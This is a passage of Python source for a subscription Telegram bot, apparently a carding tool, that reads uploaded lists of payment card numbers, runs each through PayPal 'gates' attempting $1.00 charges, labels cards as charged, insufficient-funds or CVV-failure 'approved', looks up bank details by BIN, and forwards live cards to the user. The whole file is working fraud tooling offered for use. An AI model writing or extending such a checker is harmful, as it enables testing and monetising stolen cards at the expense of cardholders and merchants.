📈 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
📉 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
━━━━━━━━━━━━━━━━━━
💫 @o8380'''
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=final_text
            )
        except:
            pass
        
        if user_id in stop_stripe_auth:
            del stop_stripe_auth[user_id]
        set_user_check_active(call.from_user.id, gate_name, False)

    threading.Thread(target=stripe_auth_function).start()






@bot.callback_query_handler(func=lambda call: call.data == 'paypal')
def paypal_callback(call):
    """Paypal Gateway Handler - Each user has their own check"""
    gate_name = '𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$ (8 𝐆𝐚𝐭𝐞𝐬)'
    user_id = str(call.from_user.id)
    
    # Check subscription
    if not check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Premium access required!")
        send_subscription_message(call.message.chat.id)
        return
    
    # Check if user has file
    filename = get_user_file(call.from_user.id)
    if not filename or not os.path.exists(filename):
        bot.send_message(call.message.chat.id, "❌ No file found. Please upload a file first.")
        return
    
    # Check if user can start check
    can_check, error_msg = can_user_check(call.from_user.id)
    if not can_check:
        bot.answer_callback_query(call.id, f"❌ {error_msg}")
        return
    
    # Set user check active
    set_user_check_active(call.from_user.id, gate_name, True)

    def paypal_function():
        user = call.from_user
        stop_paypal[user_id] = False
        stats = {'approved': 0, 'declined': 0, 'charged': 0, 'total': 0}
        
        # Gate functions
        def gate1_func(cc):
            try:
                checker = paypal_custom1()
                return checker.check_card(cc)
            except:
                return "ERROR"
        
        def gate2_func(cc):
            try:
                checker = paypal_custom2()
                return checker.check_card(cc)
            except:
                return "ERROR"
        
        
        gates = [
            {'name': '𝐆𝐚𝐭𝐞 𝟏', 'function': gate1_func},
            {'name': '𝐆𝐚𝐭𝐞 𝟐', 'function': gate2_func}
        ]
        
        # Read cards from user's file
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                cards = [line.strip() for line in file if line.strip()]
                stats['total'] = len(cards)
        except:
            bot.send_message(call.message.chat.id, "❌ Error reading file")
            set_user_check_active(call.from_user.id, gate_name, False)
            return
        
        # Progress message with buttons
        markup = types.InlineKeyboardMarkup(row_width=1)
        stop_button = types.InlineKeyboardButton("⏹ 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤", callback_data='stop_paypal', style='danger', icon_custom_emoji_id="5242195906199035850")
        markup.add(stop_button)
        
        welcome_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐂𝐚𝐫𝐝𝐬...
━━━━━━━━━━━━━━━━━━
⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
━━━━━━━━━━━━━━━━━━
💫 𝐁𝐨𝐭 𝐁𝐲: @o8380'''
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_text,
                reply_markup=markup
            )
        except:
            pass
        
        processed = 0
        
        for cc in cards:
            # Check stop flag
            if stop_paypal.get(user_id, False):
                break
            
            processed += 1
            start_time = time.time()
            bin_number = cc[:6]
            bin_info = get_bin_display(bin_number)
            
            # Try gates until one succeeds or all fail
            response = None
            selected_gate = None
            gate_attempted = 0
            
            for gate in gates:
                gate_attempted += 1
                selected_gate = gate
                
                # Get response from current gate
                try:
                    response = str(gate['function'](cc))
                except:
                    response = "ERROR"
                
                # Check if response contains "ERROR" or "GATE ERROR TOKEN"
                if "ERROR" in response.upper() or "GATE ERROR TOKEN" in response:
                    # Skip this gate and try the next one
                    continue
                else:
                    # Valid response found, break the loop
                    break
            else:
                # If all gates returned ERROR, set response to last error
                response = "ERROR - All gates failed"
            
            response_lower = response.lower() if response else ""
            
            # Check status
            is_approved = False
            status_display = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧"
            
            # Check for Charged response
            if response and ('𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$' in response or 'charged 1.00$' in response_lower or 'COMPLETED' in response):
                stats['charged'] += 1
                stats['approved'] += 1
                is_approved = True
                status_display = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$"
            elif response and 'insufficient_funds' in response_lower:
                stats['approved'] += 1
                is_approved = True
                status_display = "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬"
            elif response and 'cvv2_failure' in response_lower:
                stats['approved'] += 1
                is_approved = True
                status_display = "𝐂𝐕𝐕 𝐅𝐚𝐢𝐥𝐮𝐫𝐞"
            else:
                stats['declined'] += 1
                status_display = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
            
            # Update progress with buttons
            progress_markup = types.InlineKeyboardMarkup(row_width=1)
            
            # Create buttons
            gate_button = types.InlineKeyboardButton(
                f"𝐆𝐚𝐭𝐞: {selected_gate['name'] if selected_gate else 'None'}", 
                callback_data='ignore',
                style='primary',
                icon_custom_emoji_id="5242195906199035850"
            )
            progress_button = types.InlineKeyboardButton(
                f" 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {processed}/{stats['total']}", 
                callback_data='ignore',
                style='primary',
                icon_custom_emoji_id="5071491301443110142"
            )
            approved_button = types.InlineKeyboardButton(
                f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}", 
                callback_data='ignore',
                style='success',
                icon_custom_emoji_id="5165928140404426202"
            )
            declined_button = types.InlineKeyboardButton(
                f"  𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}", 
                callback_data='ignore',
                style='danger',
                icon_custom_emoji_id="5974342591552952895"
            )
            charged_button = types.InlineKeyboardButton(
                f" 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']}", 
                callback_data='ignore',
                style='success',
                icon_custom_emoji_id="4965219701572503640"
            )
            stop_btn = types.InlineKeyboardButton(
                "𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤", 
                callback_data='stop_paypal',
                style='danger',
                icon_custom_emoji_id="4965219701572503640"
                
            )
            
            # Add all buttons
            progress_markup.add(
                gate_button,
                progress_button,
                approved_button,
                declined_button,
                charged_button,
                stop_btn
            )
            
            progress_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠: {gate_name}
━━━━━━━━━━━━━━━━━━
💳 𝐂𝐚𝐫𝐝: <code>{cc}</code>
📝 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response[:100] if response else "No response"}...
📊 𝐒𝐭𝐚𝐭𝐮𝐬: {status_display}
━━━━━━━━━━━━━━━━━━'''
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=progress_text,
                    reply_markup=progress_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            # Send approved message
            if is_approved and response:
                approved_msg = f'''<b>
#𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏.𝟎𝟎$ <tg-emoji emoji-id='4965219701572503640'>💰</tg-emoji>
━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>⌬</a>] 𝐂𝐚𝐫𝐝 ➺ <code>{cc}</code>
[<a href='t.me/o8380'>⌬</a>] 𝐆𝐚𝐭𝐞 ➺ {gate_name}
[<a href='t.me/o8380'>⌬</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response[:150]}
━━━━━━━━━━━━━━━━━━
{dato(cc[:6])}
━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>⌬</a>] 𝐒𝐮𝐛-𝐆𝐚𝐭𝐞 ➺ {selected_gate['name'] if selected_gate else 'None'}
[<a href='t.me/o8380'>⌬</a>] 𝐓𝐢𝐦𝐞 ➺ {"{:.1f}".format(time.time() - start_time)}𝐬
[<a href='t.me/o8380'>⌬</a>] 𝐁𝐨𝐭 𝐁𝐲 ➺ <a href='t.me/o8380'>𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐞𝐫𝐘𝐚𝐬𝐬𝐢𝐧</a></b>'''
                
                try:
                    bot.send_message(call.from_user.id, approved_msg, parse_mode="HTML")
                except:
                    pass
            
            # Check stop flag
            if stop_paypal.get(user_id, False):
                break
            
            time.sleep(5)
        
        # Final message
        if stop_paypal.get(user_id, False):
            final_text = f'''━━━━━━━━━━━━━━━━━━'''  '''
🛑 𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐨𝐩𝐩𝐞𝐝
━━━━━━━━━━━━━━━━━━
📊 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
📈 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
📉 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
💰 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']}
━━━━━━━━━━━━━━━━━━'''
        else:
            final_text = f'''━━━━━━━━━━━━━━━━━━
✅ 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝
━━━━━━━━━━━━━━━━━━
📊 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate_name}
📈 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
📉 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
💰 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']}
━━━━━━━━━━━━━━━━━━
💫 @o8380'''
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=final_text
            )
        except:
            pass
        
        # Clean up
        if user_id in stop_paypal:
            del stop_paypal[user_id]
        set_user_check_active(call.from_user.id, gate_name, False)

    threading.Thread(target=paypal_function).start()
    




def dato(zh):
	try:
		api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
		brand=api_url["brand"]
		card_type=api_url["type"]
		level=api_url["level"]
		bank=api_url["bank"]
		country_name=api_url["country_name"]
		country_flag=api_url["country_flag"]
		mn = f'''[<a href="https://t.me/o8380">⌬</a>] 𝐁𝐢𝐧 ➜ <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/o8380">⌬</a>] 𝐁𝐚𝐧𝐤 ➜ <code>{bank} - {country_flag}</code>
[<a href="https://t.me/o8380">⌬</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ <code>{country_name} [ {country_flag} ]</code>'''
		return mn
	except Exception as e:
		print(e)
		return 'No info'





#<a href="https://t.me/o8380">⌬</a>
print("Bot is running...")                              

while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")
